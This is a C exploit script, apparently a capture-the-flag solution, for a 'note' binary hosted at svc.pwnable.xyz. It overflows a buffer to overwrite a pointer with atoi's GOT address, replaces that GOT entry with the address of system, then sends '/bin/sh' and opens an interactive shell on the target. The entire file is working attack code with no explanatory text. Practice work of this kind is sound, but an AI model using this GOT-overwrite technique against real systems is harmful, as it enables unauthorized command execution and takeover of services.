#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <exdev.h>

#ifdef EXPLOIT_LOCAL
#define BINPATH "./note"
#else
#include <netinet/in.h>
#define HOST "svc.pwnable.xyz"
#define PORT 30016
#endif

uint64_t atoi_gotplt = 0x601268;
uint64_t system_addr = 0x400756;

int main(int argc, char **argv, char **envp){
    char buf[255];
    memset(buf, 0, 255);

#ifdef EXPLOIT_LOCAL
#define TARGET_STDIN p->stdin
#define TARGET_STDOUT p->stdout
#define TARGET_STDERR p->stderr
    PROC *p = NULL;
    char *args[] = {BINPATH, NULL};

    p = process(BINPATH, args, envp, 0);
    if(!p){
        fprintf(stderr, "%s:%d:process(): Failed to spawn process\n", __FILE__, __LINE__);
        return 1;
    }

#else
#define TARGET_STDIN r->sock
#define TARGET_STDOUT r->sock
#define TARGET_STDERR r->sock
    REMOTE *r = NULL;

    r = remote(HOST, PORT, AF_INET, SOCK_STREAM);
    if(!r){
        fprintf(stderr, "%s:%d:remote(): Failed to connect to %s:%hu", __FILE__, __LINE__, HOST, PORT);
        return 1;
    }
#endif
    read(TARGET_STDOUT, buf, 17);
    read(TARGET_STDOUT, buf, 48);
    
    buf[0] = '1';
    buf[1] = '\n';
    buf[2] = '\0';
    write(TARGET_STDIN, buf, 3);
    read(TARGET_STDOUT, buf, 10);
    
    buf[0] = '4';
    buf[1] = '0';
    buf[2] = '\n';
    buf[3] = '\0';
    write(TARGET_STDIN, buf, 4);
    read(TARGET_STDOUT, buf, 6);
    memset(buf, 0x41, 32);
    *(uint64_t *)(buf+32) = atoi_gotplt;
    write(TARGET_STDIN, buf, 40);

    read(TARGET_STDOUT, buf, 48);
    buf[0] = '2';
    buf[1] = '\n';
    buf[2] = '\0';
    write(TARGET_STDIN, buf, 3);
    read(TARGET_STDOUT, buf, 6);
    *(uint64_t *)(buf) = system_addr;
    memset((buf+8), 0x00, 24);
    write(TARGET_STDIN, buf, 32);

    read(TARGET_STDOUT, buf, 48);
    strncpy(buf, "/bin/sh\n", 9);
    write(TARGET_STDIN, buf, 8);
    shell(TARGET_STDIN, TARGET_STDOUT, TARGET_STDERR);

    return 0;
}